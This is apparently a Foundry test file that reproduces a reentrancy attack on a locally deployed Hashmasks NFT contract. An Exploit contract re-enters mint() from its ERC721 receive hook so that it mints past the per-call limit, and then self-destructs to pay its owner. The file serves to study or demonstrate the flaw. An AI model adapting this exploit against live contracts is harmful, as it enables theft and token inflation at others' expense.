// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.16;

import {Ownable} from "openzeppelin/access/Ownable.sol";
import {IERC721Receiver} from "openzeppelin/token/ERC721/IERC721Receiver.sol";
import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {Utilities} from "./Utilities.sol";
import {Hashmasks} from "../src/Hashmasks.sol";

contract Exploit is Ownable {
    Hashmasks private hashmasks;
    uint256 private maxCalls;
    uint256 private callIx;

    constructor(Hashmasks _hashmasks, uint256 _maxCalls) payable {
      hashmasks = _hashmasks;
      maxCalls = _maxCalls;
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {

        if (callIx < maxCalls) {
          callIx++;
          hashmasks.mint(20);
        }


        return this.onERC721Received.selector;
    }

    function run() external onlyOwner {
      hashmasks.mint{value: 20 * 0.001 ether}(20);

      uint256 count = hashmasks.balanceOf(address(this));
      console2.log("balanceOf(Exploit))", count);

      // TODO: transfer all minted NTF's to owner
      selfdestruct(payable(owner()));
    }
}

contract HashmasksTest is Test {
    Utilities private utils;
    address payable private attacker;
    Hashmasks private hashmasks;
    Exploit private exploit;

    function setUp() public {
      utils = new Utilities();

      address payable[] memory users = utils.createUsers(1);
      attacker = users[0];
      vm.label(attacker, "Attacker");

      hashmasks = new Hashmasks();

      vm.prank(attacker);
      exploit = new Exploit{value: 1 ether}(hashmasks, 1);
    }

    function testReentrancy() public {
      vm.startPrank(attacker);
      exploit.run();
      vm.stopPrank();

      validate();
    }

    function validate() private {
      assertGt(hashmasks.totalSupply(), 20);
    }
}
